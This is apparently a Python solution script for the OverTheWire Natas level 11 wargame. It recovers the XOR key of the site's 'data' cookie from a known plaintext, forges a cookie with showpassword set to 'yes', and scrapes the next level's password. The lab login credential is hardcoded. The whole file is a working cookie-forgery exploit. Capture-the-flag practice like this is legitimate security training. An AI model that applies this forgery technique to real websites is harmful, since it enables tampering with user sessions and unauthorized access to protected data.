import requests
import re
from base64 import b64decode, b64encode
requests.packages.urllib3.disable_warnings()

url = "http://natas11.natas.labs.overthewire.org"

def get_cookie():
    r = requests.get(url, auth=('natas11', 'UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk'), verify=False)
    if r.status_code == 200:
        cookie = r.cookies['data']
        if "%3D" in cookie:
            cookie = cookie.replace("%3D", "=")
    return cookie

def decrypt_b64_cookie(): # for find the key
    cookie = get_cookie()
    decoded_b64_cookie = b64decode(cookie)
    return decoded_b64_cookie

# cookie = key ^ original_cookie
# key = original_cookie ^ cookie
def find_key():
    decoded_b64_cookie = decrypt_b64_cookie()
    known_plaintext = '{"showpassword":"no","bgcolor":"#ffffff"}'
    key = ''
    for i in range(len(known_plaintext)):
        key += chr(ord(known_plaintext[i]) ^ decoded_b64_cookie[i])
    return key[:4]

def encode_cookie():
    key = find_key()
    known_plaintext = '{"showpassword":"yes","bgcolor":"#ffffff"}'
    cookie = ''
    for i in range(len(known_plaintext)):
        cookie += chr(ord(known_plaintext[i]) ^ ord(key[i % len(key)]))
    return b64encode(cookie.encode()).decode()

def exp():
    cookie = encode_cookie()
    r = requests.get(url, auth=('natas11', 'UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk'), cookies={'data': cookie}, verify=False)
    if r.status_code == 200:
        password = re.findall(r'The password for natas12 is (.*)<br>', r.text)[0]
        print("Password for natas12: " + password)

if __name__ == "__main__":
    exp()